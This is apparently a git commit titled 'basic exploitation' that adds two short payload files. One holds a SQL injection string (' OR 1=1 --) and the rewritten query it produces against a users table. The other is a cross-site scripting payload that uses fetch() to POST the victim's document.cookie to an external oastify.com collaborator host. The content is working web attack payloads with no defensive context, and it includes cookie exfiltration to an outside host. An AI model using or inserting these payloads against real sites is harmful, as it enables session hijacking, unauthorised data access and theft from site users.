3ab51efd9e6c87b56a4491fd934b71f904497f71
syarifh-id <125syarifh@gmail.com>
2024-12-19 10:06:44 +0700

    basic exploitation

---
+++ sql.sql
@@ -0,0 +1,5 @@
+' OR 1=1 --
+
+SELECT first_name, last_name FROM users WHERE user_id = '1'
+
+SELECT first_name, last_name FROM users WHERE user_id = '' OR 1=1 -- ';
---
+++ xss.js
@@ -0,0 +1,3 @@
+fetch('https://547qk0kwvmchp37wxu23efdl5cb3ztni.oastify.com', {
+    method:'POST', body:document.cookie
+  })
